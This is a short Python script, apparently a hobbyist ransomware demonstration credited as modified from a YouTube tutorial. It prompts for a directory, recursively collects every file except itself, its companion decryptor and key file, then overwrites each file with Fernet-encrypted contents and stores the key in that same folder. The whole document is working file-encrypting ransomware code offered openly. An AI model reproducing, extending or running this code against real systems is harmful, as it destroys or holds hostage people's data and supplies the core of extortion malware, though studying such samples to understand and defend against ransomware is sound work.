#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

path = input("Type the path to encrypt, just for practical purposes: ")

files = []

def iterator(directoryPath):
    
    for item in os.listdir(directoryPath):
        
        if item != __file__ and item != 'ransomDecrypt.py' and item != 'ransomKey.key':
            
            item = os.path.join(directoryPath, item)
            
            if os.path.isfile(item):
                files.append(item)
                
            elif os.path.isdir(item):
                iterator(item)

try:
    iterator(path)
except:
    print("Upsss, something went wrong! Take a look for the typed path")

key = Fernet.generate_key()

with open(os.path.join(path, 'ransomKey.key'), "wb") as ransomKey:
    ransomKey.write(key)
    
for file in files:
    with open(file, "rb") as fileToEncrypt:
        contents = fileToEncrypt.read()
    contentsEncrypt = Fernet(key).encrypt(contents)
    
    with open(file, "wb") as fileToEncrypt:
        fileToEncrypt.write(contentsEncrypt)
        
#   NOTE: THIS CODE WAS ORIGINALLY CREATED BY NETWORKCHUCK IN HIS YOUTUBE CHANNEL BUT I'VE MODIFIED IT IN SOME DETAILS AND ADDED NEW FUNCTIONALITIES